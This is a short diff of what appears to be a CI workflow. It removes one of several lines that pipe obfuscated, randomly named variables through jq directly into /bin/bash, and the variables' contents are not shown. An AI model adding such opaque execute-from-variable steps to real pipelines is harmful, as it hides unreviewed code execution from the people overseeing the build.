@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$p04446" | jq -r .yxuy0773 | /bin/bash
           printf '%s' "$j71419" | jq -r .x2113 | /bin/bash
           echo $svfgo153 | jq -r .p812 | /bin/bash
-          echo $c311 | jq -r .zlnw8 | /bin/bash
           echo $aztzr7 | jq -r .ur5289 | /bin/bash
 
       - name: Save results
